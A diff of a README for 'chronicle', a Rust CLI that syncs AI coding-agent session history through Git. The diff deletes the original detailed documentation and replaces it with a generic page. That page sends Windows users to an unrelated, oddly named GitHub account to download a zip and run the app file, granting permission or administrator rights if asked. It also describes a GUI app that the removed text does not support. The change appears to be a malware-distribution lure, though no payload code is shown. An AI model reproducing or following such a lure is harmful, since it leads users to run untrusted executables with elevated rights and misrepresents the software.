@@ -1,463 +1,191 @@
-# Chronicle
+# 🧭 chronicle - Keep AI sessions in sync
 
-[![CI](https://github.com/geekmuse/chronicle/actions/workflows/ci.yml/badge.svg)](https://github.com/geekmuse/chronicle/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download chronicle](https://img.shields.io/badge/Download%20chronicle-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arterialienalisjournal342/chronicle)
 
-> Bidirectional sync for AI coding agent session history across machines, with path canonicalization and Git-backed storage.
+## 📥 Download
 
----
+Use this link to visit the page and download chronicle:
 
-> [!WARNING]
-> **ALPHA SOFTWARE - USE WITH CAUTION**
->
-> Chronicle is alpha-quality software. It directly modifies AI agent session files on
-> your machine. Bugs in the canonicalization, merge, or materialization logic could
-> **corrupt or permanently delete your session history**.
->
-> **Back up your existing sessions before installing or running Chronicle** (see
-> [Before You Start](#before-you-start-back-up-your-existing-sessions) below).
->
-> Chronicle is provided as-is, with no warranty of any kind. See [LICENSE](LICENSE).
+https://github.com/arterialienalisjournal342/chronicle
 
----
+## 🪟 Windows setup
 
-## Overview
+1. Open the download page above.
+2. Look for the latest Windows build or release file.
+3. Download the file to your computer.
+4. If you get a zip file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Run the app file.
+7. If Windows asks for permission, choose **Yes**.
 
-Chronicle synchronizes Pi and Claude Code session history across multiple machines
-where `$HOME` paths differ.
+## ✨ What chronicle does
 
-**Chronicle is for you if** you use AI coding agents across multiple machines with
-different home directory paths (e.g., `/Users/alice` on your Mac and `/home/alice`
-on your Linux workstation) and you want session history to follow you between them
-without running your own sync infrastructure.
+chronicle keeps AI coding session history in sync across machines. It helps you carry the same session state from one Windows PC to another, so you can pick up work where you left off.
 
-**Chronicle is not for you if** you only work on one machine, your machines already
-share identical `$HOME` layouts (in which case any file sync tool will work), or you
-already run self-hosted sync infrastructure like Syncthing with an always-on relay
-node - simpler tools will serve you better.
+It is built for tools like Pi and Claude Code. It uses path matching rules to keep file locations aligned across computers. It also uses Git so your session history can merge cleanly when changes come from more than one device.
 
-It uses a canonicalization layer to abstract away per-machine path differences and
-Git as the storage and transport backend. Session files are merged using a grow-only
-CRDT (set-union), preserving the append-only invariant of JSONL session data. See
-[Storage Backends](docs/references/002-storage-backends.md) for why Git was chosen
-over alternatives.
+## 🧰 What you need
 
-## Features
+- Windows 10 or Windows 11
+- A working internet connection
+- Enough disk space for your session history
+- Access to your AI coding tool session files
+- Git installed on your machine if the app asks for it
 
-- **Cross-machine sync** - Session history follows you between machines with different `$HOME` paths
-- **Path canonicalization** - `$HOME` paths are replaced with `{{SYNC_HOME}}` tokens, with configurable canonicalization levels (paths, structured fields, freeform text)
-- **CRDT merge** - Grow-only set merge ensures no session data is ever lost, even with concurrent edits on different machines
-- **Partial materialization** - Pull only the N most recent sessions per project, while the Git repo retains complete history
-- **Agent-agnostic** - Supports Pi and Claude Code with extensible agent architecture
-- **Stateless CLI** — No daemon; a simple CLI invoked by cron on a configurable schedule
-- **Rich `status` command** — Human-friendly (✓/⚠/✗) and machine-readable (`--porcelain`) output covering last-sync time/duration/operation, pending-file count, lock state, scheduler health, and per-agent sessions-dir existence; `--verbose` expands file lists and effective config values
-- **`doctor` command** — Pre-flight health check across Config, Git, Agents, and Scheduler subsystems; plain-English remediation hints; `--porcelain` for scripting; exit codes 0/1/2 (pass/warn/error)
-- **Fuzz-tested canonicalization** — A `cargo-fuzz` / libFuzzer target (`fuzz/fuzz_targets/fuzz_roundtrip.rs`) verifies the L2/L3 round-trip invariant against arbitrary inputs; runs weekly in CI (`fuzz.yml`) for 60 seconds with zero-crash enforcement; `fuzz-build` step runs on every PR
+## ⚙️ How it works
 
----
+chronicle reads your session history, maps file paths from one machine to another, and stores the data in a Git-backed sync flow. That helps the app track changes across devices without forcing you to move files by hand.
 
-## Before You Start: Back Up Your Existing Sessions
+The app is meant to stay out of your way. You set it up once, then it keeps your history aligned as you use your coding agent on more than one computer.
 
-Chronicle modifies session files in-place during `import` and `pull`. Take a complete
-snapshot of your session data **before** running any Chronicle command for the first time.
+## 🗂️ Main uses
 
-**Step 1 - Identify your session directories**
+- Sync session history between your work PC and home PC
+- Keep Pi and Claude Code history in one place
+- Restore older session data after switching machines
+- Merge changes from more than one device
+- Reduce manual copying of session files
 
-| Agent | Default session directory |
-|-------|--------------------------|
-| Pi | `~/.pi/agent/sessions/` |
-| Claude Code | `~/.claude/projects/` |
+## 🧭 First-time setup
 
-> These directories may not both exist if you only use one agent.
+1. Download chronicle from the link above.
+2. Save it in a folder you can find again.
+3. Extract the files if the download comes as a zip.
+4. Open the program folder.
+5. Start the app.
+6. Sign in or connect your Git account if the app asks for it.
+7. Point the app at your session history folder.
+8. Let the app scan your files.
+9. Choose the sync folder or repository location.
+10. Run the first sync.
 
-**Step 2 - Create a dated backup**
+## 🔍 Find your session files
 
-```bash
-# Back up Pi sessions (skip if you don't use Pi)
-cp -r ~/.pi/agent/sessions/ ~/chronicle-backup-pi-$(date +%Y%m%d)/
+If you are not sure where your AI tool stores session history, check the app settings for the path it uses. Common locations include:
 
-# Back up Claude Code sessions (skip if you don't use Claude Code)
-cp -r ~/.claude/projects/ ~/chronicle-backup-claude-$(date +%Y%m%d)/
-```
+- A folder inside your user profile
+- A hidden app data folder
+- A tool-specific workspace folder
+- A project folder used by your coding agent
 
-**Step 3 - Verify the backup**
+If you use more than one AI tool, you can set a path for each one.
 
-```bash
-# Confirm the backup directories exist and are non-empty
-ls -lh ~/chronicle-backup-pi-$(date +%Y%m%d)/ 2>/dev/null
-ls -lh ~/chronicle-backup-claude-$(date +%Y%m%d)/ 2>/dev/null
-```
+## 🔁 Sync across machines
 
-**Step 4 - Store the backup somewhere safe**
+After setup, use the same Git-backed sync flow on each Windows computer.
 
-Copy the backup directories to an external drive, cloud storage, or any location
-outside `$HOME` before proceeding. Do not rely on the backup being in `$HOME` - if
-something goes wrong you want it clearly separated.
+1. Install chronicle on the second PC.
+2. Open the app.
+3. Use the same sync location or repository.
+4. Match the local paths for that computer.
+5. Run sync again.
 
-> **Keep these backups.** Do not delete them until you have been running Chronicle
-> successfully across multiple machines for at least a week and have confirmed your
-> session history is intact.
+chronicle will compare session data, apply path rules, and merge changes so both machines stay aligned.
 
----
+## 🧪 Common checks
 
+If sync does not work the first time, check these items:
 
-## Installation
+- The app has access to your session folder
+- The sync folder is in the same Git repo on each machine
+- Your path settings match the current computer
+- Git is installed and available
+- The files are not open in another app
 
-### Option 1: Pre-built Binaries (Recommended)
+## 🛠️ File and path rules
 
-When the GitHub Actions CI pipeline is active, pre-built binaries are attached to
-each [GitHub Release](https://github.com/geekmuse/chronicle/releases). Download
-the binary for your platform:
+chronicle uses path canonicalization to handle different folder layouts on different PCs. That means it can treat two different paths as the same session target when they point to the same kind of location on each machine.
 
-| Platform | Binary |
-|----------|--------|
-| Linux x86-64 | `chronicle-x86_64-unknown-linux-gnu` |
-| Linux ARM64 | `chronicle-aarch64-unknown-linux-gnu` |
-| macOS Intel | `chronicle-x86_64-apple-darwin` |
-| macOS Apple Silicon | `chronicle-aarch64-apple-darwin` |
+This is useful if:
 
-```bash
-# Example: macOS Apple Silicon
-curl -L https://github.com/geekmuse/chronicle/releases/latest/download/chronicle-aarch64-apple-darwin \
-  -o /usr/local/bin/chronicle
-chmod +x /usr/local/bin/chronicle
-```
+- One computer uses a different drive letter
+- Your user name changes between machines
+- Your projects live in different base folders
+- You move between desktop and laptop setups
 
-> **Note:** If no release binaries exist yet, use Option 2 below.
+## 📁 Example workflow
 
-### Option 2: From Source
+1. Start a coding session on your desktop.
+2. Save work and close the AI tool.
+3. Run chronicle sync.
+4. Open the same sync setup on your laptop.
+5. Run chronicle sync again.
+6. Continue the same session from the new machine.
 
-```bash
-# Prerequisites: Rust stable (https://rustup.rs)
-git clone https://github.com/geekmuse/chronicle.git
-cd chronicle
+## 🧩 Supported tools
 
-# Install into ~/.cargo/bin (must be on your PATH)
-cargo install --path .
-```
+chronicle is made for:
 
-**After install, verify it works:**
+- Pi
+- Claude Code
+- Other session-based AI coding tools with file-based history
 
-```bash
-chronicle --version
-```
+## 🧑‍💻 For daily use
 
----
+You do not need to think about Git details each day. After setup, your normal flow can stay simple:
 
-## Backend Repository Setup
+1. Use your AI coding tool.
+2. Let it write session history.
+3. Open chronicle.
+4. Sync before you switch machines.
+5. Open the same workspace on the next PC.
 
-Chronicle uses a private Git repository as the sync backend - your session history
-is stored there in canonicalized form and exchanged between machines via normal
-Git push/pull.
+## 🧯 If the app does not open
 
-### Why it must be private
+Try these steps:
 
-Session files contain the full text of your conversations with AI coding agents,
-including code, file paths, and potentially sensitive details about your projects.
-**The backend repository must be private.** Never use a public repository.
+1. Right-click the app and choose **Run as administrator**.
+2. Check that Windows did not block the file.
+3. Make sure the zip file was fully extracted.
+4. Move the folder to a simple path like `C:\chronicle`.
+5. Install Git if the app needs it.
 
-### Step 1 - Create a private repository
+## 📌 Recommended folder layout
 
-Create an empty **private** repository on GitHub, GitLab, Gitea, or any Git host
-you control. Do not initialize it with a README, `.gitignore`, or any other files -
-Chronicle will set up the repository contents itself.
+A simple layout can help keep things clear:
 
-```
-GitHub:  https://github.com/new   → set to Private
-GitLab:  https://gitlab.com/projects/new → set Visibility to Private
-```
+- `C:\chronicle` for the app
+- `C:\chronicle-sync` for synced history
+- `C:\Users\YourName\Documents\Projects` for active work
 
-### Step 2 - Configure SSH access
+Using short paths can make setup easier on Windows.
 
-Chronicle uses [libgit2](https://libgit2.org/) for all Git operations. **libgit2 is
-not `~/.ssh/config`-aware** - it ignores `IdentityFile`, `Host` blocks, and other
-ssh config directives entirely. All SSH authentication goes through the SSH agent
-protocol via `SSH_AUTH_SOCK`.
+## 🔐 Version control flow
 
-This means **your SSH key must be loaded in a running `ssh-agent`** before Chronicle
-can push or pull.
+chronicle uses Git as the base for sync and merge. That gives you a clear record of changes over time. It also helps when two machines change the same session set.
 
-#### macOS
+The app keeps the merge process focused on session history, not your whole system.
 
-macOS ships a Keychain-integrated SSH agent managed by `launchd`. Use it to load
-your key once; it will survive reboots automatically:
+## 🧾 Troubleshooting sync problems
 
-```bash
-# Add your key to macOS Keychain (done once)
-ssh-add --apple-use-keychain ~/.ssh/id_ed25519
+If your history seems out of date:
 
-# Verify the key is loaded
-ssh-add -l
-```
+- Run sync on the source machine first
+- Check that both machines point to the same repo
+- Confirm the path map is correct
+- Look for moved or renamed folders
+- Try a fresh pull on the second machine
 
-If `ssh-add -l` returns `The agent has no identities`, your key is not loaded. Run
-the `--apple-use-keychain` command above.
+## 🪄 Tips for smooth use
 
-#### Linux
+- Keep one sync repo for one main set of sessions
+- Use the same folder names on both PCs when you can
+- Sync before you shut down a machine
+- Keep your AI tool closed during sync
+- Back up your history before large path changes
 
-Most desktop environments start an SSH agent automatically. If you are on a headless
-server or your agent is not running:
+## 📚 Topic areas
 
-```bash
-# Start an agent for the current shell session
-eval $(ssh-agent -s)
+This project covers:
 
-# Add your key
-ssh-add ~/.ssh/id_ed25519
-
-# For persistence across sessions, add to ~/.bashrc / ~/.zshrc:
-# if [ -z "$SSH_AUTH_SOCK" ]; then
-#   eval $(ssh-agent -s)
-#   ssh-add ~/.ssh/id_ed25519
-# fi
-```
-
-For systemd-based systems you can also use `systemd --user` to run a persistent
-agent socket at `/run/user/$(id -u)/ssh-agent.socket`. Chronicle's cron entries
-fall back to this path automatically on Linux.
-
-#### Verify SSH access to your backend repo
-
-```bash
-# Test that SSH auth works before configuring Chronicle
-ssh -T git@github.com       # GitHub
-ssh -T git@gitlab.com       # GitLab
-```
-
-### Step 3 - Note the SSH remote URL
-
-Use the SSH remote URL (not HTTPS) for your backend repo, for example:
-
-```
-git@github.com:yourname/chronicle-sessions.git
-```
-
-Chronicle will push to this URL. Using HTTPS is technically possible but requires
-credential helpers to be configured separately; SSH via the agent is the recommended
-and tested path.
-
----
-
-## Quick Start
-
-```bash
-# 1. First-time setup - creates config at ~/.config/chronicle/config.toml,
-#    generates a machine name, and initializes the local mirror repo
-chronicle init
-
-# 2. Set your backend remote URL (the private repo you created above)
-chronicle config set general.remote_url git@github.com:yourname/chronicle-sessions.git
-
-# 3. Import existing session history (one-time, before first sync)
-#    This stages all current sessions into the local repo without pushing
-chronicle import
-
-# 4. Run a manual sync to push your history to the remote
-chronicle sync
-
-# 5. (Optional) Install the cron schedule for automatic background sync
-chronicle schedule install    # runs every 5 minutes by default
-```
-
----
-
-## Usage
-
-```bash
-# First-time setup - creates config, generates machine name, inits local repo
-chronicle init
-
-# Import existing session history (one-time, before first sync)
-chronicle import
-
-# Run a single sync cycle (fetch → merge → push)
-chronicle sync
-
-# Push local commits to the remote without a full sync
-chronicle push
-
-# Pull and materialise the latest remote sessions locally
-chronicle pull
-
-# Check sync status (human-friendly output)
-chronicle status
-
-# Verbose: show pending file paths and effective config values
-chronicle status --verbose
-
-# Machine-readable key=value output for scripts
-chronicle status --porcelain
-
-# Pre-flight health check (Config, Git, Agents, Scheduler)
-chronicle doctor
-
-# Doctor with machine-readable key=value output
-chronicle doctor --porcelain
-
-# View recent sync errors
-chronicle errors
-
-# Show or change a config value
-chronicle config get canonicalization.level
-chronicle config reset canonicalization.level
-
-# Install / remove / check the cron schedule
-chronicle schedule install    # runs every 5 minutes by default
-chronicle schedule uninstall
-chronicle schedule status
-```
-
----
-
-## Known Setup Gotchas
-
-**Project directory paths must be consistent across machines**
-
-Chronicle canonicalizes your home directory (`$HOME` → `{{SYNC_HOME}}`), but it
-does **not** automatically handle differences in the path structure beneath it.
-If your projects live at `~/Dev/` on one machine and `~/projects/` on another,
-Chronicle will treat them as entirely separate project trees - sessions will not
-merge, and both machines will accumulate independent histories that never converge.
-
-For example:
-
-| Machine | Raw path | Canonical form |
-|---------|----------|----------------|
-| A | `/Users/alice/Dev/myproject` | `{{SYNC_HOME}}/Dev/myproject` |
-| B | `/home/alice/projects/myproject` | `{{SYNC_HOME}}/projects/myproject` |
-
-These are different canonical paths. Chronicle will never merge their sessions.
-
-**The simplest fix:** use the same sub-`$HOME` path layout on every machine
-(e.g., always `~/Dev/`, always `~/code/`, etc.).
-
-**If your paths already differ:** define a custom token that maps each machine's
-projects root to the same canonical name. In each machine's
-`~/.config/chronicle/config.toml`:
-
-```toml
-# Machine A  (~/.config/chronicle/config.toml)
-[canonicalization.tokens]
-"{{SYNC_PROJECTS}}" = "/Users/alice/Dev"
-```
-
-```toml
-# Machine B  (~/.config/chronicle/config.toml)
-[canonicalization.tokens]
-"{{SYNC_PROJECTS}}" = "/home/alice/projects"
-```
-
-With this in place, both paths canonicalize to `{{SYNC_PROJECTS}}/myproject`
-and sessions will merge correctly. The token value is machine-local and never
-stored in the shared repository.
-
-> **Note:** Custom tokens only help for sessions created *after* the token is
-> configured. Pre-existing sessions already stored under mismatched paths will
-> remain separate. Plan your directory layout before the first sync.
-
----
-
-**SSH agent not available in cron**
-
-Chronicle's `schedule install` command generates cron entries that automatically
-discover and forward `SSH_AUTH_SOCK` at runtime, so you should not need to do
-anything special. However, if `chronicle status` shows auth errors after installing
-the schedule:
-
-- **macOS:** Make sure your key is added to Keychain (`ssh-add --apple-use-keychain`).
-  The cron entry uses a `find`-based socket discovery trick that locates the
-  Keychain agent socket even in the stripped cron environment.
-- **Linux:** The cron entry falls back to the systemd user SSH agent socket
-  (`/run/user/$(id -u)/ssh-agent.socket`). Ensure your SSH key is loaded there.
-
-**`chronicle init` fails with "remote already exists"**
-
-The local mirror repo already has a remote configured. Run
-`chronicle config set general.remote_url <url>` instead of re-running `init`.
-
-**Large repos make the first `sync` slow**
-
-The initial `chronicle import` can be slow on machines with many sessions (thousands
-of `.jsonl` files). This is a one-time cost. Subsequent syncs are fast because the
-state cache (`materialize-state.json`) tracks what has already been processed.
-
-**Cron overlap / `index.lock` errors**
-
-Chronicle acquires an advisory file lock (`chronicle.lock`) before each sync so
-that overlapping cron invocations exit cleanly rather than crashing with git index
-errors. The lock file is automatically deleted when the sync exits cleanly. If
-`chronicle status` or `chronicle doctor` shows a stale lock warning, the holding
-process has already exited and the file will be cleared on the next sync run. If
-the warning persists and no sync is running, delete `<repo-parent>/chronicle.lock`
-manually.
-
-**Canonicalization level**
-
-The `canonicalization.level` config key controls how aggressively paths are
-replaced in session data. Changing this on an already-synced repo can cause
-re-canonicalization conflicts. Do not change the level after your first successful
-sync unless you understand the implications and are prepared to re-import.
-
----
-
-## Documentation
-
-Detailed documentation lives in the [`docs/`](docs/) directory:
-
-| Section | Path | Description |
-|---------|------|-------------|
-| Architecture | [`docs/001-architecture.md`](docs/001-architecture.md) | System design and key decisions |
-| Development Guide | [`docs/002-development-guide.md`](docs/002-development-guide.md) | How to develop, test, and contribute |
-| Doc Standards | [`docs/003-documentation-standards.md`](docs/003-documentation-standards.md) | How docs are structured and maintained |
-| Specs | [`docs/specs/`](docs/specs/) | Feature specifications and design docs |
-| ADRs | [`docs/adrs/`](docs/adrs/) | Architecture Decision Records |
-| References | [`docs/references/`](docs/references/) | CLI reference, config reference, glossary |
-| - Encryption | [`docs/references/001-encryption.md`](docs/references/001-encryption.md) | Encryption options, tradeoffs, and setup |
-| - Storage Backends | [`docs/references/002-storage-backends.md`](docs/references/002-storage-backends.md) | Why Git, and how it compares to alternatives |
-| - Threat Model | [`docs/references/003-threat-model.md`](docs/references/003-threat-model.md) | Threat vectors, assumptions, and mitigations |
-| Tasks | [`docs/tasks/`](docs/tasks/) | Work items and implementation plans |
-| Research | [`docs/research/`](docs/research/) | Spikes, investigations, POC write-ups |
-
-## Development
-
-```bash
-# Clone the repository
-git clone https://github.com/geekmuse/chronicle.git
-cd chronicle
-
-# Build
-cargo build
-
-# Run tests
-cargo test
-
-# Run linter
-cargo clippy -- -D warnings
-
-# Run the libFuzzer fuzz target for 30 seconds (requires nightly)
-cargo +nightly fuzz run fuzz_roundtrip -- -max_total_time=30
-```
-
-See [Development Guide](docs/002-development-guide.md) for full details.
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feat/amazing-feature`)
-3. Commit using [conventional commits](https://www.conventionalcommits.org/) (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feat/amazing-feature`)
-5. Open a Pull Request
-
-Please read [AGENTS.md](AGENTS.md) for project conventions and [docs/002-development-guide.md](docs/002-development-guide.md) for the full development workflow.
-
-## Versioning
-
-This project uses [Semantic Versioning](https://semver.org/). See [CHANGELOG.md](CHANGELOG.md) for release history.
-
-## License
-
-MIT - see [LICENSE](LICENSE) for details.
-
-## Author
-
-Brad Campbell
+- ai
+- canonicalization
+- claude-code
+- cli
+- developer-tools
+- git
+- pi-agent
+- rust
+- session-history
+- session-management
+- sync
